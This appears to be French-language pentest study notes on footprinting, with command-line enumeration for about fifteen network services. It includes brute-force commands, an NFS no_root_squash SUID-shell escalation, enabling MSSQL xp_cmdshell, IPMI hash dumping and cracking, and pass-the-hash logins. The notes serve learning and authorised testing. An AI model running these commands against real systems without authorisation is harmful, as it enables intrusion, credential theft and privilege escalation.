# 04 — Footprinting

## Objectifs
Énumérer en profondeur les services exposés : FTP, SMB, NFS, DNS, SMTP, IMAP/POP3, LDAP, MySQL, MSSQL, Oracle, IPMI, SSH, RDP, WinRM, SNMP. Extraire utilisateurs, partages, versions, configurations.

---

## Infrastructure — vue externe

```bash
# Certificate Transparency
curl -s "https://crt.sh/?q=%25.<DOMAIN>&output=json" | jq -r '.[].name_value' | sort -u

# Shodan
shodan host <IP>
shodan search "org:<COMPANY>"

# WHOIS / DNS
whois <DOMAIN>
dig +short A <DOMAIN>; dig +short MX <DOMAIN>; dig +short NS <DOMAIN>
dig axfr <DOMAIN> @<NS>

# Emails / employés
theHarvester -d <DOMAIN> -b bing,linkedin,duckduckgo
```

---

## FTP (21)

```bash
ftp <TARGET>                        # login anonymous / anonymous
nc -nv <TARGET> 21
openssl s_client -connect <TARGET>:21 -starttls ftp   # FTPS

# Anonymous + téléchargement récursif
wget -m --no-passive ftp://anonymous:anonymous@<TARGET>

# Brute force
hydra -L users.txt -P <WORDLIST> ftp://<TARGET>

# Nmap
nmap -p21 --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor <TARGET>
```

> Chercher : `anonymous` autorisé, écriture, fichiers de config, `.ssh/`.

---

## SMB (139/445)

```bash
# Null session / partages
smbclient -N -L //<TARGET>
smbclient //<TARGET>/<SHARE> -N
smbmap -H <TARGET> -u '' -p ''
netexec smb <TARGET> -u '' -p '' --shares
enum4linux-ng -A <TARGET>

# Avec identifiants
smbclient //<TARGET>/<SHARE> -U '<USER>%<PASS>'
smbmap -H <TARGET> -u <USER> -p <PASS> -r <SHARE>
netexec smb <TARGET> -u <USER> -p <PASS> --shares --users --groups --pass-pol --sessions

# RID brute force
netexec smb <TARGET> -u <USER> -p <PASS> --rid-brute
impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<TARGET>

# Montage
sudo mount -t cifs //<TARGET>/<SHARE> /mnt/share -o username=<USER>,password=<PASS>,domain=<DOMAIN>

# Téléchargement récursif
smbclient //<TARGET>/<SHARE> -U '<USER>%<PASS>' -c 'prompt OFF; recurse ON; mget *'

# Vulnérabilités
nmap -p445 --script smb-vuln-* <TARGET>
nmap -p445 --script smb-os-discovery <TARGET>
```

---

## NFS (111/2049)

```bash
# Exports
showmount -e <TARGET>
rpcinfo -p <TARGET>

# Montage
sudo mkdir -p /mnt/nfs && sudo mount -t nfs <TARGET>:/<EXPORT> /mnt/nfs -o nolock

# no_root_squash : créer un binaire SUID
# Sur la cible NFS montée :
sudo cp /bin/bash /mnt/nfs/bash && sudo chmod +s /mnt/nfs/bash
# Puis sur la cible : /<EXPORT>/bash -p

# Nmap
nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <TARGET>
```

> `no_root_squash` + écriture = escalade root quasi certaine.

---

## DNS (53)

```bash
# Requêtes de base
dig A <DOMAIN> @<TARGET>
dig MX <DOMAIN> @<TARGET>
dig TXT <DOMAIN> @<TARGET>
dig CH TXT version.bind @<TARGET>      # version BIND

# Transfert de zone
dig axfr <DOMAIN> @<NS>
dig axfr @<TARGET> <DOMAIN>
fierce --domain <DOMAIN> --dns-servers <TARGET>

# Brute force de sous-domaines
dnsenum <DOMAIN>
dnsrecon -d <DOMAIN> -t std,brt
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r <TARGET>:53

# Reverse
dnsrecon -r 10.10.10.0/24 -n <TARGET>
```

---

## SMTP (25/465/587)

```bash
# Banner
nc -nv <TARGET> 25
telnet <TARGET> 25

# VRFY / EXPN / RCPT pour valider des utilisateurs
smtp-user-enum -M VRFY -U users.txt -t <TARGET>
smtp-user-enum -M RCPT -U users.txt -t <TARGET> -D <DOMAIN>

# Enumération manuelle
EHLO test
VRFY root
EXPN root
MAIL FROM:<a@b.c>
RCPT TO:<root@<DOMAIN>>

# Nmap
nmap -p25 --script smtp-commands,smtp-enum-users,smtp-open-relay <TARGET>
```

---

## IMAP / POP3 (143/993, 110/995)

```bash
nc -nv <TARGET> 143
# a1 LOGIN <USER> <PASS>
# a2 LIST "" "*"
# a3 SELECT INBOX

nc -nv <TARGET> 110
# USER <USER>
# PASS <PASS>
# LIST

# Brute force
hydra -L users.txt -P <WORDLIST> imap://<TARGET>
hydra -L users.txt -P <WORDLIST> pop3://<TARGET>
```

---

## LDAP (389/636)

```bash
# RootDSE anonyme
ldapsearch -H ldap://<TARGET> -x -s base -b "" "(objectClass=*)"
ldapsearch -H ldap://<TARGET> -x -b "dc=<DOMAIN>,dc=htb" "(objectClass=*)"

# Avec creds
ldapsearch -H ldap://<TARGET> -x -D "<USER>@<DOMAIN>" -w <PASS> -b "dc=<DOMAIN>,dc=htb" "(objectClass=user)" sAMAccountName

# Windapsearch / ldapdomaindump
python3 windapsearch.py -d <DOMAIN> -u <USER> -p <PASS> --da
ldapdomaindump -u '<DOMAIN>\<USER>' -p <PASS> <TARGET>

# Nmap
nmap -p389,636 --script ldap-rootdse,ldap-search <TARGET>
```

---

## MySQL (3306)

```bash
mysql -u root -h <TARGET> -p
mysql -u <USER> -p<PASS> -h <TARGET> -e "SHOW DATABASES;"

# Sans client
nmap -p3306 --script mysql-info,mysql-enum,mysql-databases,mysql-users -a <TARGET>
nmap -p3306 --script mysql-empty-password <TARGET>

# Brute force
hydra -L users.txt -P <WORDLIST> mysql://<TARGET>
```

---

## MSSQL (1433)

```bash
# Client
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET> -windows-auth
sqlcmd -S <TARGET> -U <USER> -P <PASS>

# Requêtes utiles
SELECT name FROM sys.databases;
SELECT * FROM sys.sql_logins;
EXEC xp_cmdshell 'whoami';
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

# Nmap
nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-brute <TARGET>
```

---

## Oracle (1521)

```bash
# TNS listener
nmap -p1521 --script oracle-tns-version,oracle-sid-brute <TARGET>

# odat
odat sidguesser -s <TARGET> -p 1521
odat passwordguesser -s <TARGET> -p 1521 -d <SID> -U users.txt -P <WORDLIST>
odat all -s <TARGET> -p 1521 -d <SID> -U <USER> -P <PASS>
```

---

## IPMI (623)

```bash
# Version + hash
nmap -sU -p623 --script ipmi-version <TARGET>
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS <TARGET>; run"

# Hash dump (RAKP)
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET>; run"

# Crack du hash IPMI (format 2)
hashcat -m 7300 hash.txt <WORDLIST>
```

> Le hash RAKP permet souvent de récupérer le mot de passe admin BMC.

---

## SSH (22)

```bash
ssh <USER>@<TARGET>
ssh -i id_rsa <USER>@<TARGET>

# Méthodes d'auth supportées
nmap -p22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET>

# Brute force
hydra -L users.txt -P <WORDLIST> ssh://<TARGET>
netexec ssh <TARGET> -u <USER> -p <PASS>

# Clé privée trouvée → permissions
chmod 600 id_rsa
ssh-keygen -y -f id_rsa > id_rsa.pub
```

---

## RDP (3389)

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /cert:ignore /dynamic-resolution
rdesktop -u <USER> -p <PASS> <TARGET>

# Vérifier NLA / info
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info <TARGET>
netexec rdp <TARGET> -u <USER> -p <PASS>

# Brute force (attention au verrouillage)
hydra -L users.txt -P <WORDLIST> rdp://<TARGET>
```

---

## WinRM (5985/5986)

```bash
evil-winrm -i <TARGET> -u <USER> -p <PASS>
evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>
netexec winrm <TARGET> -u <USER> -p <PASS>
```

---

## SNMP (161 UDP)

```bash
# Community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET>
nmap -sU -p161 --script snmp-brute <TARGET>

# Walk
snmpwalk -v2c -c public <TARGET>
snmpwalk -v1 -c public <TARGET> 1.3.6.1.2.1
snmpwalk -v2c -c public <TARGET> 1.3.6.1.4.1.77.1.2.25   # utilisateurs Windows
snmp-check <TARGET> -c public

# Extraire les processus / logiciels
snmpwalk -v2c -c public <TARGET> 1.3.6.1.2.1.25.4.2.1.2
```

---

## Checklist par service
| Service | À vérifier |
|---|---|
| FTP | anonymous, écriture, fichiers sensibles |
| SMB | null session, partages lisibles, RID, vulnérabilités |
| NFS | exports, `no_root_squash`, écriture |
| DNS | AXFR, sous-domaines, version |
| SMTP | VRFY/RCPT, relais ouvert |
| LDAP | anonyme, attributs, utilisateurs |
| SQL | mots de passe vides, xp_cmdshell, fichiers |
| IPMI | hash RAKP, mot de passe par défaut |
| SNMP | community `public`/`private`, utilisateurs |
| RDP/WinRM | NLA, creds réutilisés |
